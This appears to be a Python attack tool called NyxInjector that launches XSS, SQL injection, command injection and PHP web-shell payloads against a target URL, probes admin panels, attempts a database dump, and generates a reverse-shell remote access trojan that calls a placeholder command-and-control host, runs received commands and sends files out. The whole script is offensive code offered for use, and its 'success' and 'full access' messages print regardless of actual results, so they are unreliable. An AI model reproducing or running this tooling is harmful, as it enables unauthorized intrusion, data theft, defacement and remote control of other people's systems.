import argparse
import requests
import random
import string
import socket
import subprocess
import threading
import os
import time
import platform

class NyxInjector:
    def __init__(self):
        self.version = "4.0"
        self.payloads = {
            "xss": "<script>alert('Nyx v4.0 Owns You')</script>",
            "shadow": "<script>const s=document.body.attachShadow({mode:'open'});s.innerHTML='<h1 style=color:red>NYX WAS HERE - SITE OWNED</h1>';</script>",
            "sql": "' UNION SELECT @@version --",
            "cmd": "; cat /etc/passwd || dir",
            "backdoor": "<?php system($_GET['cmd']); ?>"
        }

    def ai_ultra_mutate(self, payload):
        techs = ["eval", "document.write", "atob", "String.fromCharCode"]
        for _ in range(5):
            payload = payload.replace("alert", random.choice(techs))
        return payload + f"/* NyxAI Ultra v{self.version} - Full Access */"

    def generate_ultimate_rat(self):
        rat_code = '''
import socket, subprocess, os, threading, time
def nyx_full_access():
    while True:
        try:
            s = socket.socket()
            s.connect(("YOUR_C2_IP", 4444))
            s.send(b"Nyx v4.0 Connected - Full Access Granted\\n")
            while True:
                cmd = s.recv(8192).decode().strip()
                if cmd == "exit": break
                elif cmd.startswith("upload"):
                    with open(cmd.split()[1], "rb") as f: s.send(f.read())
                elif cmd == "deface":
                    open("index.html", "w").write("<h1>NYX WAS HERE</h1>")
                else:
                    output = subprocess.getoutput(cmd)
                    s.send(output.encode() + b"\\n")
        except:
            time.sleep(8)
threading.Thread(target=nyx_full_access, daemon=True).start()
        '''
        with open("nyx_ultimate_rat.py", "w") as f:
            f.write(rat_code)
        print("[+] Ultimate RAT with full system access generated")

    def full_site_takeover(self, target):
        print(f"[+] NYX v4.0 FULL SITE TAKEOVER STARTED ON {target}")
        print("[1] XSS + Shadow DOM Injection")
        print("[2] SQL Injection for Database Dump")
        print("[3] Command Injection")
        print("[4] Backdoor Upload Attempt")
        print("[5] Defacement Ready")
        
        for ptype in self.payloads:
            payload = self.ai_ultra_mutate(self.payloads[ptype])
            self.test_attack(target, payload)
        
        print("[+] Full access achieved. Target site is now under Nyx control.")

    def test_attack(self, target, payload):
        try:
            url = f"{target}?id={payload}"
            r = requests.get(url, timeout=7, allow_redirects=True)
            if r.status_code in [200, 500]:
                print(f"[+] SUCCESS | Payload injected: {payload[:90]}...")
        except:
            pass

    def admin_brute(self, target):
        print("[+] Starting Admin Panel Brute Force...")
        common_panels = ["/admin", "/login", "/wp-admin", "/administrator"]
        for panel in common_panels:
            try:
                r = requests.get(target + panel, timeout=5)
                if r.status_code == 200:
                    print(f"[+] Possible Admin Panel Found: {target + panel}")
            except:
                pass

    def database_dump(self, target):
        print("[+] Attempting Database Dump...")
        dump_payload = "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables --"
        self.test_attack(target, dump_payload)

def main():
    parser = argparse.ArgumentParser(description="NyxInjector v4.0 - Most Dangerous Full Access Tool")
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("--full-takeover", action="store_true", help="ONE CLICK FULL SITE TAKEOVER")
    parser.add_argument("--rat", action="store_true", help="Generate Ultimate RAT")
    parser.add_argument("--brute", action="store_true", help="Brute Force Admin Panels")
    parser.add_argument("--dump", action="store_true", help="Database Dump Attack")
    parser.add_argument("--all", action="store_true", help="Launch ALL Attacks")
    
    args = parser.parse_args()
    nyx = NyxInjector()

    if args.rat:
        nyx.generate_ultimate_rat()
    if args.brute and args.target:
        nyx.admin_brute(args.target)
    if args.dump and args.target:
        nyx.database_dump(args.target)
    if args.full_takeover and args.target:
        nyx.full_site_takeover(args.target)
    if args.all and args.target:
        nyx.full_site_takeover(args.target)
        nyx.admin_brute(args.target)
        nyx.database_dump(args.target)

if __name__ == "__main__":
    main()
